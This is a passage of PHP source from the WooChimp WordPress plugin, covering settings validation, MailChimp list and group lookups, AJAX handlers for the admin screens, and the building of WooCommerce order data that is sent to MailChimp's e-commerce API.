                            if (is_array($rule['empty']) && !empty($rule['empty']) && $input['woochimp_'.$rule['empty'][0]] != '1' && (empty($input[$field]) || $input[$field] == '0')) {
                                if (is_array($rule['empty']) && !empty($rule['empty'])) {
                                    $revert[$rule['empty'][0]] = '1';
                                }
                                array_push($errors, array('setting' => $field, 'code' => 'option'));
                            }
                            else {
                                $output[$field] = ($input[$field] == null ? '0' : $input[$field]);
                            }

                            break;
                        }
                        else if (in_array($field, array('woochimp_list_widget', 'woochimp_list_shortcode', 'woochimp_list_store'))) {
                            //$this->options[$field] = $this->get_lists();
                            if (is_array($rule['empty']) && !empty($rule['empty']) && $input['woochimp_'.$rule['empty'][0]] != '0' && (empty($input[$field]) || $input[$field] == '0')) {
                                if (is_array($rule['empty']) && !empty($rule['empty'])) {
                                    $revert[$rule['empty'][0]] = '0';
                                }
                                array_push($errors, array('setting' => $field, 'code' => 'option'));
                            }
                            else {
                                $output[$field] = ($input[$field] == null ? '0' : $input[$field]);
                            }

                            break;
                        }

                        if (isset($this->options[$field][$input[$field]]) || ($input[$field] == '' && $allow_empty)) {
                            $output[$field] = ($input[$field] == null ? '0' : $input[$field]);
                        }
                        else {
                            if (is_array($rule['empty']) && !empty($rule['empty'])) {
                                $revert[$rule['empty'][0]] = '0';
                            }
                            array_push($errors, array('setting' => $field, 'code' => 'option'));
                        }
                        break;

                    // Multiple selections
                    case 'multiple_any':
                        if (empty($input[$field]) && !$allow_empty) {
                            if (is_array($rule['empty']) && !empty($rule['empty'])) {
                                $revert[$rule['empty'][0]] = '0';
                            }
                            array_push($errors, array('setting' => $field, 'code' => 'multiple_any'));
                        }
                        else {
                            if (!empty($input[$field]) && is_array($input[$field])) {
                                $temporary_output = array();

                                foreach ($input[$field] as $field_val) {
                                    $temporary_output[] = htmlspecialchars($field_val);
                                }

                                $output[$field] = $temporary_output;
                            }
                            else {
                                $output[$field] = array();
                            }
                        }
                        break;

                    // Validate emails
                    case 'email':
                        if (filter_var(trim($input[$field]), FILTER_VALIDATE_EMAIL) || ($input[$field] == '' && $allow_empty)) {
                            $output[$field] = esc_attr(trim($input[$field]));
                        }
                        else {
                            if (is_array($rule['empty']) && !empty($rule['empty'])) {
                                $revert[$rule['empty'][0]] = '0';
                            }
                            array_push($errors, array('setting' => $field, 'code' => 'email'));
                        }
                        break;

                    // Validate URLs
                    case 'url':
                        // FILTER_VALIDATE_URL for filter_var() does not work as expected
                        if (($input[$field] == '' && !$allow_empty)) {
                            if (is_array($rule['empty']) && !empty($rule['empty'])) {
                                $revert[$rule['empty'][0]] = '0';
                            }
                            array_push($errors, array('setting' => $field, 'code' => 'url'));
                        }
                        else {
                            $output[$field] = esc_attr(trim($input[$field]));
                        }
                        break;

                    // Custom validation function
                    case 'function':
                        $function_name = 'validate_' . $field;
                        $validation_results = $this->$function_name($input[$field]);

                        // Check if parent is disabled - do not validate then and reset to ''
                        if (is_array($rule['empty']) && !empty($rule['empty'])) {
                            if (empty($input['woochimp_'.$rule['empty'][0]])) {
                                $output[$field] = '';
                                break;
                            }
                        }

                        if (($input[$field] == '' && $allow_empty) || $validation_results === true) {
                            $output[$field] = $input[$field];
                        }
                        else {
                            if (is_array($rule['empty']) && !empty($rule['empty'])) {
                                $revert[$rule['empty'][0]] = '0';
                            }
                            array_push($errors, array('setting' => $field, 'code' => 'option', 'custom' => $validation_results));
                        }
                        break;

                    // Default validation rule (text fields etc)
                    default:
                        if (((!isset($input[$field]) || $input[$field] == '') && !$allow_empty)) {
                            if (is_array($rule['empty']) && !empty($rule['empty'])) {
                                $revert[$rule['empty'][0]] = '0';
                            }
                            array_push($errors, array('setting' => $field, 'code' => 'string'));
                        }
                        else {
                            $output[$field] = isset($input[$field]) ? esc_attr(trim($input[$field])) : '';
                        }
                        break;
                }

                // Strip slashes from store id
                if ($field === 'woochimp_store_id') {
                    $output[$field] = str_replace('/', '', $output[$field]);
                }
            }

            // Revert parent fields if needed
            if (!empty($revert)) {
                foreach ($revert as $key => $value) {
                    $output['woochimp_'.$key] = $value;
                }
            }

        }

        // Display settings updated message
        add_settings_error(
            'woochimp_settings_updated',
            'woochimp_settings_updated',
            __('Your settings have been saved.', 'woochimp'),
            'updated'
        );

        // Define error messages
        $messages = array(
            'number' => __('must be numeric', 'woochimp'),
            'bool' => __('must be either 0 or 1', 'woochimp'),
            'option' => __('is not allowed', 'woochimp'),
            'email' => __('is not a valid email address', 'woochimp'),
            'url' => __('is not a valid URL', 'woochimp'),
            'string' => __('is not a valid text string', 'woochimp'),
        );

        // Display errors
        foreach ($errors as $error) {

            $message = (!isset($error['custom']) ? $messages[$error['code']] : $error['custom']) . '. ' . __('Reverted to a previous state.', 'woochimp');

            add_settings_error(
                $error['setting'],
                $error['code'],
                __('Value of', 'woochimp') . ' "' . $this->titles[$error['setting']] . '" ' . $message
            );
        }

        return $output;
    }

    /**
     * Custom validation for service provider API key
     *
     * @access public
     * @param string $key
     * @return mixed
     */
    public function validate_woochimp_api_key($key)
    {
        if (empty($key)) {
            return 'is empty';
        }

        $test_results = $this->test_mailchimp($key);

        if ($test_results === true) {
            return true;
        }
        else {
            return ' is not valid or something went wrong. More details: ' . $test_results;
        }
    }

    /**
     * Load scripts required for admin
     *
     * @access public
     * @return void
     */
    public function enqueue_scripts()
    {
        // Font awesome (icons)
        wp_register_style('woochimp-font-awesome', WOOCHIMP_PLUGIN_URL . '/assets/css/font-awesome/css/font-awesome.min.css', array(), '4.5.0');

        // Our own scripts and styles
        wp_register_script('woochimp', WOOCHIMP_PLUGIN_URL . '/assets/js/woochimp-admin.js', array('jquery'), WOOCHIMP_VERSION);
        wp_register_style('woochimp', WOOCHIMP_PLUGIN_URL . '/assets/css/style.css', array(), WOOCHIMP_VERSION);

        // Scripts
        wp_enqueue_script('media-upload');
        wp_enqueue_script('thickbox');
        wp_enqueue_script('jquery');
        wp_enqueue_script('jquery-ui');
        wp_enqueue_script('jquery-ui-accordion');
        wp_enqueue_script('jquery-ui-tooltip');
        wp_enqueue_script('woochimp');

        // Styles
        wp_enqueue_style('thickbox');
        wp_register_style('jquery-ui', WOOCHIMP_PLUGIN_URL . '/assets/jquery-ui/jquery-ui.min.css', array(), WOOCHIMP_VERSION);
        wp_enqueue_style('jquery-ui');
        wp_enqueue_style('woochimp-font-awesome');
        wp_enqueue_style('woochimp');
    }

    /**
     * Load Select2 scripts and styles
     *
     * @access public
     * @return void
     */
    public function enqueue_select2()
    {
        // Select2
        wp_register_script('jquery-woochimp-select2', WOOCHIMP_PLUGIN_URL . '/assets/js/select2v4.0.0.js', array('jquery'), '4.0.0');
        wp_enqueue_script('jquery-woochimp-select2');

        // Isolated script
        wp_register_script('jquery-woochimp-select2-rp', WOOCHIMP_PLUGIN_URL . '/assets/js/select2_rp.js', array('jquery'), WOOCHIMP_VERSION);
        wp_enqueue_script('jquery-woochimp-select2-rp');

        // Styles
        wp_register_style('jquery-woochimp-select2-css', WOOCHIMP_PLUGIN_URL . '/assets/css/select2v4.0.0.css', array(), '4.0.0');
        wp_enqueue_style('jquery-woochimp-select2-css');

        // Print scripts before WordPress takes care of it automatically (helps load our version of Select2 before any other plugin does it)
        add_action('wp_print_scripts', array($this, 'print_select2'));
    }

    /**
     * Print Select2 scripts
     *
     * @access public
     * @return void
     */
    public function print_select2()
    {
        remove_action('wp_print_scripts', array($this, 'print_select2'));
        wp_print_scripts('jquery-woochimp-select2');
        wp_print_scripts('jquery-woochimp-select2-rp');
    }

    /**
     * Load frontend scripts and styles, depending on context
     *
     * @access public
     * @param string $context
     * @return void
     */
    public function load_frontend_assets($context = '')
    {
        // Load general assets
        $this->enqueue_frontend_scripts();

        // Skins are needed only for form, not for checkout checkbox
        if ($context != 'checkbox') {
            $this->enqueue_form_skins();
        }
    }

    /**
     * Load scripts required for frontend
     *
     * @access public
     * @return void
     */
    public function enqueue_frontend_scripts()
    {
        wp_register_script('woochimp-frontend', WOOCHIMP_PLUGIN_URL . '/assets/js/woochimp-frontend.js', array('jquery'), WOOCHIMP_VERSION);
        wp_register_style('woochimp', WOOCHIMP_PLUGIN_URL . '/assets/css/style.css', array(), WOOCHIMP_VERSION);
        wp_enqueue_script('woochimp-frontend');
        wp_enqueue_style('woochimp');
    }

    /**
     * Load CSS for selected skins
     */
    public function enqueue_form_skins()
    {
        foreach ($this->form_styles as $key => $class) {
            if (in_array(strval($key), array($this->opt['woochimp_widget_skin'], $this->opt['woochimp_shortcode_skin']))) {
                wp_register_style('woochimp_skin_' . $key, WOOCHIMP_PLUGIN_URL . '/assets/css/skins/woochimp_skin_' . $key . '.css');
                wp_enqueue_style('woochimp_skin_' . $key);
            }
        }
    }

    /**
     * Add settings link on plugins page
     *
     * @access public
     * @return void
     */
    public function plugin_settings_link($links)
    {

        $settings_link = '<a href="http://url.rightpress.net/6044286-support" target="_blank">'.__('Support', 'woochimp').'</a>';
        array_unshift($links, $settings_link);

        // Settings
        if (WooChimp::check_environment()) {
            $settings_link = '<a href="admin.php?page=woochimp">'.__('Settings', 'woochimp').'</a>';
            array_unshift($links, $settings_link);
        }

        return $links;
    }

    /**
     * Check if WooCommerce is enabled
             *
             * @access public
             * @return void
     */
    public function woocommerce_is_enabled()
    {
        if (in_array('woocommerce/woocommerce.php', apply_filters('active_plugins', get_option('active_plugins')))) {
            return true;
        }

        return false;
    }

    /**
     * Handle plugin uninstall
     *
     * @access public
     * @return void
     */
    public function uninstall()
    {
        if (defined('WP_UNINSTALL_PLUGIN')) {
            delete_option('woochimp_options');
        }
    }

    /**
     * Return all lists from MailChimp to be used in select fields
     *
     * @access public
     * @return array
     */
    public function get_lists()
    {
        $this->load_mailchimp();

        try {
            if (!$this->mailchimp) {
                throw new Exception(__('Unable to load lists', 'woochimp'));
            }

            $lists = $this->mailchimp->get_lists();

            if ($lists['total_items'] < 1) {
                throw new Exception(__('No lists found', 'woochimp'));
            }

            $results = array('' => '');

            foreach ($lists['lists'] as $list) {
                $results[$list['id']] = $list['name'];
            }

            return $results;
        }
        catch (Exception $e) {
            $this->log_process_exception($e);
            return array('' => '');
        }
    }


    /**
     * Return all groupings/groups from MailChimp to be used in select fields
     *
     * @access public
     * @param mixed $list_id
     * @param bool $for_menu
     * @return array
     */
    public function get_groups($list_id, $for_menu = true)
    {
        $this->load_mailchimp();

        try {

            if (!$this->mailchimp) {
                throw new Exception(__('Unable to load groups', 'woochimp'));
            }

            $results = array();

            // Single list?
            if (in_array(gettype($list_id), array('integer', 'string'))) {
                $results = $this->get_list_groups($list_id, $for_menu);
            }

            // Multiple lists...
            else {
                foreach ($list_id as $list_id_key => $list_id_value) {
                    $results[$list_id_value['list']] = $this->get_list_groups($list_id_value['list'], $for_menu);
                }
            }

            return $results;
        }
        catch (Exception $e) {
            $this->log_process_exception($e);
            return array();
        }
    }


    /**
     * Get individual list's interest (group) categories and interests (groups)
     *
     * @access public
     * @param mixed $list_id
     * @param bool $for_menu
     * @return array
     */
    public function get_list_groups($list_id, $for_menu = true)
    {
        $this->load_mailchimp();

        try {

            if (!$this->mailchimp || empty($list_id)) {
                throw new Exception(__('Unable to load groups', 'woochimp'));
            }

            $categories = array();

            // Change results format
            $results = $for_menu ? array('' => '') : array();

            // Check transient
            $transient_name = 'woochimp_' . $list_id . '_interest_categories';
            $categories_raw = get_transient($transient_name);

            // Make a call to MailChimp - get and save interest categories
            if ($categories_raw === false) {
                $categories_raw = $this->mailchimp->get_interest_categories($list_id);
                set_transient($transient_name, $categories_raw, 180);
            }

            if (!$categories_raw || empty($categories_raw)) {
                throw new Exception(__('No groups found', 'woochimp'));
            }

            // Save categories
            foreach ($categories_raw['categories'] as $category) {
                $categories[$category['id']] = $category['title'];
            }

            // Iterate categories and find the interests (groups)
            foreach ($categories as $category_id => $category_title) {

                // Save title for non-menu output
                if (!$for_menu) {
                    $results[$category_id]['title'] = $category_title;
                }

                // Get interests for current category
                try {

                    // Check transient
                    $transient_name = 'woochimp_' . $list_id . '_' . $category_id . '_interests';
                    $interests = get_transient($transient_name);

                    // Make a call to MailChimp - get and save interests
                    if ($interests === false) {
                        $interests = $this->mailchimp->get_interests($list_id, $category_id);
                        set_transient($transient_name, $interests, 180);
                    }
                }
                catch (Exception $e) {
                    $this->log_process_exception($e);
                    continue;
                }

                if (!$interests || empty($interests)) {
                    continue;
                }

                // Save the output
                foreach ($interests['interests'] as $interest) {

                    // For non-menu
                    if (!$for_menu) {
                        $results[$category_id]['groups'][$interest['id']] =  $interest['name'];
                    }

                    // For menu
                    else {
                        // name is not needed in key, only id is used
                        $results[$interest['id'] . ':' . $interest['name']] = htmlspecialchars($category_title) . ': ' . htmlspecialchars($interest['name']);
                    }
                }
            }

            return $results;
        }

        catch (Exception $e) {
            $this->log_process_exception($e);
            return array();
        }
    }


    /**
     * Return all merge vars for all available lists
     *
     * @access public
     * @param array $lists
     * @return array
     */
    public function get_merge_vars($lists)
    {
        $this->load_mailchimp();

        // Unset blank list
        unset($lists['']);

        $results = array();

        try {

            if (!$this->mailchimp) {
                throw new Exception(__('Unable to load merge fields', 'woochimp'));
            }

            // Iterate all lists
            foreach (array_keys($lists) as $list_id) {

                // Get merge fields of current list
                $merge_fields = $this->mailchimp->get_merge_fields($list_id);

                if (!$merge_fields || empty($merge_fields) || !isset($merge_fields['merge_fields'])) {
                    throw new Exception(__('No merge fields found', 'woochimp'));
                }

                foreach ($merge_fields['merge_fields'] as $merge_field) {
                    $results[$merge_field['list_id']][$merge_field['tag']] = $merge_field['name'];
                }
            }

            return $results;
        }
        catch (Exception $e) {
            $this->log_process_exception($e);
            return $results;
        }
    }

    /**
     * Test MailChimp key and connection
     *
     * @access public
     * @return bool
     */
    public function test_mailchimp($key = null)
    {
        // Try to get key from options if not set
        if ($key == null) {
            $key = $this->opt['woochimp_api_key'];
        }

        // Check if api key is set now
        if (empty($key)) {
            return __('No API key provided', 'woochimp');
        }

        // Check if curl extension is loaded
        if (!function_exists('curl_exec')) {
            return __('PHP Curl extension not loaded on your server', 'woochimp');
        }

        // Load MailChimp class if not yet loaded
        if (!class_exists('WooChimp_Mailchimp')) {
            require_once WOOCHIMP_PLUGIN_PATH . 'classes/woochimp-mailchimp.class.php';
        }

        // Try to initialize MailChimp
        $this->mailchimp = new WooChimp_Mailchimp($key);

        if (!$this->mailchimp) {
            return __('Unable to initialize MailChimp class', 'woochimp');
        }

        try {
            $results = $this->mailchimp->get_account_details();

            if (!empty($results['account_id'])) {
                return true;
            }

        }
        catch (Exception $e) {
            return $e->getMessage();
        }

        return __('Something went wrong...', 'woochimp');
    }

    /**
     * Get MailChimp account details
     *
     * @access public
     * @return mixed
     */
    public function get_mailchimp_account_info()
    {

        if ($this->load_mailchimp()) {
            try {
                $results = $this->mailchimp->get_account_details();
                return $results;
            }
            catch (Exception $e) {
                return false;
            }
        }

        return false;
    }


    /**
     * Load MailChimp object
     *
     * @access public
     * @return mixed
     */
    public function load_mailchimp()
    {
        if ($this->mailchimp) {
            return true;
        }

        // Load MailChimp class if not yet loaded
        if (!class_exists('WooChimp_Mailchimp')) {
            require_once WOOCHIMP_PLUGIN_PATH . 'classes/woochimp-mailchimp.class.php';
        }

        try {
            $this->mailchimp = new WooChimp_Mailchimp($this->opt['woochimp_api_key']);
            return true;
        }
        catch (Exception $e) {
            $this->log_process_exception($e);
            return false;
        }
    }

    /**
     * Ajax - Render MailChimp status
     *
     * @access public
     * @return void
     */
    public function ajax_mailchimp_status()
    {
        if (!$this->opt['woochimp_enabled'] || empty($this->opt['woochimp_api_key'])) {
            $message = '<h4><i class="fa fa-times" style="font-size: 1.5em; color: red;"></i>&nbsp;&nbsp;&nbsp;' . __('Integration not enabled or API key not set', 'woochimp') . '</h4>';
        }
        else if ($account_info = $this->get_mailchimp_account_info()) {

            $message =  '<p><i class="fa fa-check" style="font-size: 1.5em; color: green;"></i>&nbsp;&nbsp;&nbsp;' .
                        __('Successfully connected to MailChimp account', 'woochimp') . ' <strong>' . $account_info['account_name'] . '</strong>.</p>';
        }
        else {
            $message = '<h4><i class="fa fa-times" style="font-size: 1.5em; color: red;"></i>&nbsp;&nbsp;&nbsp;' . __('Connection to MailChimp failed.', 'woochimp') . '</h4>';
            $mailchimp_error = maybe_unserialize($this->test_mailchimp());
            $mailchimp_error = $mailchimp_error['message'];

            if ($mailchimp_error !== true) {
                $message .= '<p><strong>' . __('Reason', 'woochimp') . ':</strong> '. $mailchimp_error .'</p>';
            }
        }

        echo json_encode(array('message' => $message));
        die();
    }

    /**
     * Ajax - Return MailChimp lists as array for select field
     *
     * @access public
     * @return void
     */
    public function ajax_lists_in_array()
    {
        $lists = $this->get_lists();

        // Get merge vars
        $merge = $this->get_merge_vars($lists);

        // Get selected merge vars
        if (isset($_POST['data']) && isset($_POST['data']['page']) && in_array($_POST['data']['page'], array('checkout', 'widget', 'shortcode'))) {
            if (isset($this->opt['woochimp_'.$_POST['data']['page'].'_fields']) && !empty($this->opt['woochimp_'.$_POST['data']['page'].'_fields'])) {
                $selected_merge = $this->opt['woochimp_'.$_POST['data']['page'].'_fields'];
            }
        }

        $selected_merge = isset($selected_merge) ? $selected_merge : array();

        // Do we know which list is selected?
        if (isset($_POST['data']) && isset($_POST['data']['page']) && in_array($_POST['data']['page'], array('checkout', 'widget', 'shortcode')) && $this->opt['woochimp_list_'.$_POST['data']['page']]) {
            $groups = $this->get_groups($this->opt['woochimp_list_'.$_POST['data']['page']]);

            $selected_groups = array();

            if (is_array($this->opt['woochimp_groups_'.$_POST['data']['page']])) {
                foreach ($this->opt['woochimp_groups_'.$_POST['data']['page']] as $group_val) {
                    $selected_groups[] = htmlspecialchars($group_val);
                }
            }
        }
        else {
            $groups = array('' => '');
            $selected_groups = array('' => '');
        }

        // Add all checkout properties
        $checkout_properties = array();

        if (isset($_POST['data']) && isset($_POST['data']['page']) && $_POST['data']['page'] == 'checkout') {
            $checkout_properties = $this->checkout_properties;
        }

        echo json_encode(array('message' => array('lists' => $lists, 'groups' => $groups, 'selected_groups' => $selected_groups, 'merge' => $merge, 'selected_merge' => $selected_merge, 'checkout_properties' => $checkout_properties)));
        die();
    }

    /**
     * Ajax - Return MailChimp groups and tags as array for multiselect field
     */
    public function ajax_groups_and_tags_in_array()
    {
        // Check if we have received required data
        if (isset($_POST['data']) && isset($_POST['data']['list'])) {
            $groups = $this->get_groups($_POST['data']['list']);

            $selected_groups = array();

            if (is_array($this->opt['woochimp_groups_'.$_POST['data']['page']])) {
                foreach ($this->opt['woochimp_groups_'.$_POST['data']['page']] as $group_val) {
                    $selected_groups[] = htmlspecialchars($group_val);
                }
            }

            $merge_vars = $this->get_merge_vars(array($_POST['data']['list'] => ''));
        }
        else {
            $groups = array('' => '');
            $selected_groups = array('' => '');
            $merge_vars = array('' => '');
        }

        // Add all checkout properties
        $checkout_properties = array();

        if (isset($_POST['data']) && isset($_POST['data']['page']) && $_POST['data']['page'] == 'checkout') {
            $checkout_properties = $this->checkout_properties;
        }

        echo json_encode(array('message' => array('groups' => $groups, 'selected_groups' => $selected_groups, 'merge' => $merge_vars, 'selected_merge' => array(), 'checkout_properties' => $checkout_properties)));
        die();
    }

    /**
     * Ajax - Return MailChimp groups and tags as array for multiselect field for checkout page
     */
    public function ajax_groups_and_tags_in_array_for_checkout()
    {
        // Check if we have received required data
        if (isset($_POST['data']) && isset($_POST['data']['list'])) {
            $groups = $this->get_groups($_POST['data']['list']);
            $merge_vars = $this->get_merge_vars(array($_POST['data']['list'] => ''));
        }
        else {
            $groups = array('' => '');
            $merge_vars = array('' => '');
        }

        $checkout_properties = $this->checkout_properties;

        echo json_encode(array('message' => array('groups' => $groups, 'merge' => $merge_vars, 'checkout_properties' => $checkout_properties)));
        die();
    }

    /**
     * Prepare order data for E-Commerce
     *
     * @access public
     * @param int $order_id
     * @return array
     */
    public function prepare_order_data($order_id)
    {
        // Initialize order object
        $order = wc_get_order($order_id);

        if (!$order) {
            return false;
        }

        // Get store id (or create new)
        $store_id = $this->ecomm_get_store();

        if ($store_id === false) {
            return false;
        }

        // Get customer details
        $customer_email     = $order->get_billing_email();
        $order_customer_id  = $order->get_customer_id();

        // Regular user
        if ($order_customer_id > 0) {
            $customer_id = self::ecomm_get_id('user', $order_customer_id);
        }

        // Guest
        else {

            // Create guest id based on email
            $customer_email_hash = WooChimp_Mailchimp::member_hash($customer_email);
            $customer_id = self::ecomm_get_id('guest', $customer_email_hash);
        }

        $order_billing_first_name   = $order->get_billing_first_name();
        $order_billing_last_name    = $order->get_billing_last_name();

        $customer_details = array(
            'id'            => $customer_id,
            //'email_address' => $customer_email,
            'first_name'    => !empty($order_billing_first_name) ? $order_billing_first_name : $order->get_shipping_first_name(),
            'last_name'     => !empty($order_billing_last_name) ? $order_billing_last_name : $order->get_shipping_last_name(),
            'opt_in_status' => $this->opt['woochimp_opt_in_all'] == '1' ? true : false,
        );

        // Add order count
        if ($orders_count = get_user_meta($customer_id, '_order_count', true)) {
            $customer_details['orders_count'] = (int) $orders_count;
        }

        // Add total spent
        if ($total_spent = get_user_meta($customer_id, '_money_spent', true)) {
            $customer_details['total_spent'] = (float) $total_spent;
        }

        // Provide email only for new customers
        if ($this->customer_exists($store_id, $customer_id) === false) {
            $customer_details['email_address'] = $customer_email;
        }

        // Get billing address details
        $billing_address_details = array(
            'name'          => $order->get_billing_first_name() . ' ' . $order->get_billing_last_name(),
            'address1'      => addslashes($order->get_billing_address_1()),
            'address2'      => addslashes($order->get_billing_address_2()),
            'city'          => $order->get_billing_city(),
            'province'      => $order->get_billing_state(),
            'postal_code'   => $order->get_billing_postcode(),
            'country'       => $order->get_billing_country(),
            'phone'         => $order->get_billing_phone(),
        );

        // Get shipping address details
        $shipping_address_details = array(
            'name'          => $order->get_shipping_first_name() . ' ' . $order->get_shipping_last_name(),
            'address1'      => addslashes($order->get_shipping_address_1()),
            'address2'      => addslashes($order->get_shipping_address_2()),
            'city'          => $order->get_shipping_city(),
            'province'      => $order->get_shipping_state(),
            'postal_code'   => $order->get_shipping_postcode(),
            'country'       => $order->get_shipping_country(),
        );

        $customer_details['address'] = $billing_address_details;
        unset($customer_details['address']['name']);

        // Get order details
        $order_details = array(
            'id'                   => self::ecomm_get_id('order', $order_id),
            'customer'             => $customer_details,
            'financial_status'     => $order->get_status(),
            'currency_code'        => $order->get_currency(),
            'order_total'          => (float) $order->get_total(),
            'discount_total'       => (float) $order->get_total_discount(),
            'shipping_total'       => (float) $order->get_shipping_total(),
            'tax_total'            => (float) $order->get_cart_tax(),
            'processed_at_foreign' => WooChimp::get_order_date_string($order),
            'updated_at_foreign'   => WooChimp::get_order_modified_date_string($order),
            'lines'                => array(),
            'billing_address'      => $billing_address_details,
            'shipping_address'     => $shipping_address_details,
        );

        // Check if we have campaign ID and email ID for this user/order
        $woochimp_mc_cid = self::get_mc_id('woochimp_mc_cid', $order_id);
        $woochimp_mc_eid = self::get_mc_id('woochimp_mc_eid', $order_id);

        // Pass campaign tracking properties to argument list
        if (!empty($woochimp_mc_cid)) {
            $order_details['campaign_id'] = $woochimp_mc_cid;
        }

        // Get order items
        $items = $order->get_items();

        // Populate items
        foreach ($items as $item_key => $item) {

            // Get item name
            $item_name = $item->get_name();

            // Load actual product
            $product        = $item->get_product();
            $variation_id   = $product->get_id();
            $product_id     = $product->is_type('variation') ? $product->get_parent_id() : $variation_id;

            $mc_product_id = self::ecomm_get_id('product', $product_id);
            $mc_variation_id = self::ecomm_get_id('product', $variation_id);

            // Need to create product, if not exists
            if ($this->product_exists($store_id, $mc_product_id) === false) {

                $this->log_add(sprintf(__('Product %s product does not exist, creating new...', 'woochimp'), $mc_product_id));

                $product_details = array(
                    'id'       => $mc_product_id,
                    'title'    => $item_name,
                    'variants' => array(
                            array(
                                'id'    => $mc_variation_id,
                                'title' => $item_name,
                                'sku'   => $product->get_sku(),
                            ),
                        )
                );

                $this->mailchimp->create_product($store_id, $product_details);
            }

            // If product exists, but the variation is not
            else if ($mc_product_id != $mc_variation_id) {

                // Add variation if not exists
                if ($this->product_exists($store_id, $mc_product_id, $mc_variation_id) === false) {

                    $this->log_add(sprintf(__('Variation %s of product %s does not exist, creating...', 'woochimp'), $mc_variation_id, $mc_product_id));

                    $variant_details = array(
                        'id'    => $mc_variation_id,
                        'title' => $item_name,
                        'sku'   => $product->get_sku(),
                    );

                    $this->mailchimp->create_variant($store_id, $mc_product_id, $variant_details);
                }
            }

            $order_details['lines'][] = array(
                'id'                 => self::ecomm_get_id('item', $item_key),
                'product_id'         => $mc_product_id,
                'product_variant_id' => $mc_variation_id,
                'quantity'           => (int) $item->get_quantity(),
                'price'              => $item->get_total(), // $product->get_price() doesn't fit here because of possible discounts/addons

            );
        }

        $order_details['store_id'] = $store_id;

        return $order_details;
    }

    /**
     * E-Commerce - get id for Mailchimp
     *
     * @access public
     * @param string $type
     * @param int $id
     * @return void
     */
    public static function ecomm_get_id($type, $id)
    {
        // Define prefixes
        $prefixes = apply_filters('woochimp_ecommerce_id_prefixes', array(
            'user'    => 'user_',
            'guest'   => 'guest_',
            'order'   => 'order_',
            'product' => 'product_',
            'item'    => 'item_',
        ));

        // Combine and make sure it's a string
        if (isset($prefixes[$type])) {
            return (string) $prefixes[$type] . $id;
        }

        return (string) $id;
    }

    /**
     * E-Commerce - get default store id
     *
     * @access public
     * @return void
     */
    public static function get_default_store_id()
    {
        $parsed_url = parse_url(site_url());
        $default_id = substr(preg_replace('/[^a-zA-Z0-9]+/', '', $parsed_url['host']), 0, 32);
        return $default_id;
    }

    /**
     * E-Commerce - get/create store in Mailchimp
     *
     * @access public
     * @return void
     */
    public function ecomm_get_store()
    {
        // Load MailChimp
        if (!$this->load_mailchimp()) {
            return false;
        }

        // Get selected list for Store
        $list_id = $this->opt['woochimp_list_store'];

        // Get defined name
        $store_id_set = $this->opt['woochimp_store_id'];

        // Add log entry
        $this->log_add(__('Getting the Store...', 'woochimp'));

        if (empty($list_id)) {
            $this->log_add(__('No list selected for Store.', 'woochimp'));
            return false;
        }

        // Try to find store associated with list
        try {
            $stores = $this->mailchimp->get_stores();
        }
        catch (Exception $e) {
            $this->log_process_exception($e);
            return false;
        }

        $store_id = null;

        if (!empty($stores['stores'])) {

            foreach ($stores['stores'] as $store) {

                if ($store['list_id'] == $list_id && $store['id'] == $store_id_set) {
                    $this->log_add(sprintf(__('Store %s was found.', 'woochimp'), $store['id']));
                    return $store['id'];
                }
            }
        }

        // If not found, create new
        if (is_null($store_id)) {

            $this->log_add(__('Store was not found, creating new...', 'woochimp'));

            // Get domain name from site url
            $parse = parse_url(site_url());

            // Define arguments
            $args = array(
                'id'      => !empty($this->opt['woochimp_store_id']) ? $this->opt['woochimp_store_id'] : WooChimp::get_default_store_id(),
                'list_id' => $list_id,
                'name'    => $parse['host'],
                'currency_code' => get_woocommerce_currency(),
            );

            try {
                $store = $this->mailchimp->create_store($args);
                $this->log_add(__('Store created.', 'woochimp'));
                $this->log_process_regular_data($args, $store);
                return $store['id'];
            }

            catch (Exception $e) {
                $this->log_process_exception($e);
                return false;
            }
        }
    }

    /**
     * E-Commerce - check if product exists in Mailchimp
     *
     * @access public
     * @param int $store_id
     * @param string $mc_product_id
     * @return void
     */
    public function product_exists($store_id, $mc_product_id, $mc_variation_id = '')
    {
        try {
            $product = $this->mailchimp->get_product($store_id, $mc_product_id);

            // Check variation if present
            if (!empty($mc_variation_id) && $mc_product_id != $mc_variation_id) {

                foreach ($product['variants'] as $variant) {
                    if ($variant['id'] == $mc_variation_id) {
                        return true;
                    }
                }

                // No variation found
                return false;
            }

            return true;
        }
        catch (Exception $e) {
            return false;
        }
    }

    /**
     * E-Commerce - check if order exists in Mailchimp
     *
     * @access public
     * @param int $store_id
     * @param string $mc_order_id
     * @return void
     */
    public function order_exists($store_id, $mc_order_id)
    {
        try {
            $this->mailchimp->get_order($store_id, $mc_order_id);
            return true;
        }
        catch (Exception $e) {
            return false;
        }
    }


    /**
     * Get correct MC ID field data
     *
     * @access public
     * @param string $meta_field
     * @param int $order_id
     * @return void
     */
    public static function get_mc_id($meta_field, $order_id)
    {
        if (in_array($meta_field, array('woochimp_mc_cid', 'woochimp_mc_eid'))) {

            $old_mc_id = RightPress_WC::order_get_meta($order_id, $meta_field, true);
            $new_mc_id = RightPress_WC::order_get_meta($order_id, '_' . $meta_field, true);

            if (!empty($old_mc_id)) {
                return $old_mc_id;
            }
            else {
                return $new_mc_id;
            }
        }
    }

    /**
     * Subscribe on order placed
     *
     * @access public
     * @param int $order_id
     * @return void
     */
    public function on_placed($order_id)
    {
        // Check if functionality is enabled
        if (!$this->opt['woochimp_enabled']) {
            return;
        }

        $this->log_add(__('Order placed process launched for order id: ', 'woochimp') . $order_id);

        // Check if WC order class is available and MailChimp is loaded
        if (class_exists('WC_Order') && $this->load_mailchimp()) {

            // Do we need to subscribe user on completed order or payment?
            $subscribe_on_placed = RightPress_WC::order_get_meta($order_id, 'woochimp_subscribe_on_placed', true);

            foreach (array('auto', 'checkbox') as $sets_type) {
                if ($subscribe_on_placed == $sets_type) {
                    $this->subscribe_checkout($order_id, $sets_type);
                }
            }
        }
    }

    /**
     * Subscribe on order completed status and send E-Commerce data
     *
     * @access public
     * @param int $order_id
     * @return void
     */
    public function on_completed($order_id)
    {
        // Check if functionality is enabled
        if (!$this->opt['woochimp_enabled']) {
            return;
        }

        $this->log_add(__('Order completed process launched for order id: ', 'woochimp') . $order_id);

        // Check if WC order class is available and MailChimp is loaded
        if (class_exists('WC_Order') && $this->load_mailchimp()) {

            // Do we need to subscribe user on completed order or payment?
            $subscribe_on_completed = RightPress_WC::order_get_meta($order_id, 'woochimp_subscribe_on_completed', true);
            $subscribe_on_payment = RightPress_WC::order_get_meta($order_id, 'woochimp_subscribe_on_payment', true);

